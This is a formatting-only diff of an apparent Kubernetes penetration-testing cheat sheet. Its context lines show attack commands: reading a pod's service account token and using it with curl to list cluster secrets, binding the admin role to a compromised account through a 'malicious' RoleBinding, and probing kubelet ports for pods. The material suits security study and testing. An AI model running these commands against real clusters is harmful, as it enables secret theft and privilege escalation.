@@ -2,16 +2,16 @@
 
 > Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.
 
-## Summary 
+## Summary
 
 - [Tools](#tools)
 - [RBAC Configuration](#rbac-configuration)
-    - [Listing Secrets](#listing-secrets)
-    - [Access Any Resource or Verb](#access-any-resource-or-verb)
-    - [Pod Creation](#pod-creation)
-    - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
-    - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
-    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
+  - [Listing Secrets](#listing-secrets)
+  - [Access Any Resource or Verb](#access-any-resource-or-verb)
+  - [Pod Creation](#pod-creation)
+  - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
+  - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
+  - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
 - [Privileged Service Account Token](#privileged-service-account-token)
 - [Interesting endpoints to reach](#interesting-endpoints-to-reach)
 - [API addresses that you should know](#api-adresses-that-you-should-know)
@@ -86,7 +86,7 @@ kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh
 
 ### Privilege to Get/Patch Rolebindings
 
-The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account. 
+The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account.
 Create a malicious RoleBinging.json file.
 
 ```powershell
@@ -126,8 +126,8 @@ curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H
 ## Privileged Service Account Token
 
 ```powershell
-$ cat /run/secrets/kubernetes.io/serviceaccount/token
-$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
+cat /run/secrets/kubernetes.io/serviceaccount/token
+curl -k -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/
 ```
 
 ## Interesting endpoints to reach
@@ -146,8 +146,7 @@ curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/ex
 curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
 ```
 
-
-## API addresses that you should know 
+## API addresses that you should know
 
 *(External network visibility)*
 
@@ -193,7 +192,6 @@ curl -k https://<IP address>:10250/pods
 curl -k https://<IP Address>:10255
 http://<external-IP>:10255/pods
 ```
-
 
 ## References
 
